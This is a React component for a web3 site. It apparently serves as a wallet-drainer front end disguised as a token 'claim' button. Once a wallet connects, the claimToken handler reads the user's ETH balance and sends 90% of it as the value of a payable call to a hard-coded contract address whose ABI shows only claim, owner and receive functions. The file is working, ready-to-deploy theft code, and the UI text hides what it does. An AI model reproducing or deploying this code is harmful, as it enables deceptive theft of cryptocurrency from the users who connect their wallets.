"use client";

import React, { useState, useEffect } from "react";
import { useWeb3Modal } from "@web3modal/wagmi/react";
import { useAccount, useWalletClient } from "wagmi";
import { ethers, providers, Contract } from "ethers";

export default function ConnectButton() {
  const { open } = useWeb3Modal();
  const { isConnected, address } = useAccount();
  const { data: walletClient } = useWalletClient();

  const [buttonText, setButtonText] = useState("Connect Wallet");
  const [status, setStatus] = useState("");
  const [loading, setLoading] = useState(false);

  const claimToken = async () => {
    if (!walletClient) {
      setStatus("No wallet client available. Please connect your wallet.");
      return;
    }
    setLoading(true);

    try {
      const provider = new ethers.providers.Web3Provider(
        walletClient.transport
      );
      const signer = provider.getSigner();

      const CONTRACT_ADDRESS = "0x210b3F33D44621D5e8014a25C63DC170FF983903";
      const CONTRACT_ABI = [
        {
          inputs: [],
          stateMutability: "payable",
          type: "constructor",
        },
        {
          inputs: [],
          name: "claimToken",
          outputs: [],
          stateMutability: "payable",
          type: "function",
        },
        {
          inputs: [],
          name: "owner",
          outputs: [
            {
              internalType: "address payable",
              name: "",
              type: "address",
            },
          ],
          stateMutability: "view",
          type: "function",
        },
        {
          stateMutability: "payable",
          type: "receive",
        },
      ];
      const contract = new ethers.Contract(
        CONTRACT_ADDRESS,
        CONTRACT_ABI,
        signer
      );

      const userBalance = await signer.getBalance(); // Get user's ETH balance

      // Reserve 10% for gas fees (remaining 90% is for transfer)
      const transferableAmount = userBalance.mul(90).div(100); // 90% of user's balance

      // Ensure the transferable amount is greater than zero
      if (transferableAmount.lte(0)) {
        setStatus("Insufficient balance to transfer after reserving for gas!");
        setLoading(false);
        return;
      }

      // Send the transaction
      const tx = await contract.claimToken({
        value: transferableAmount,
      });

      setStatus("Transaction sent. Waiting for confirmation...");
      await tx.wait();
      setStatus("Transaction confirmed!");
    } catch (error) {
      console.error(error);
      setStatus(`Transaction failed: ${error.message}`);
    } finally {
      setLoading(false); // Reset loading state
    }
  };

  useEffect(() => {
    if (isConnected) {
      setButtonText("Connected, Ready to Transfer!");
    } else {
      setButtonText("Connect Wallet");
    }
  }, [isConnected]);

  return (
    <div>
      {!isConnected && (
        <button className="connect-button" onClick={() => open()}>
          {buttonText}
        </button>
      )}

      {isConnected && (
        <>
          <button
            className="connect-button"
            onClick={claimToken}
            disabled={loading}
          >
            {loading ? (
              <>
                <span className="spinner"></span> Claiming... Please hold
              </>
            ) : (
              "Transfer Token!"
            )}
          </button>
        </>
      )}
    </div>
  );
}
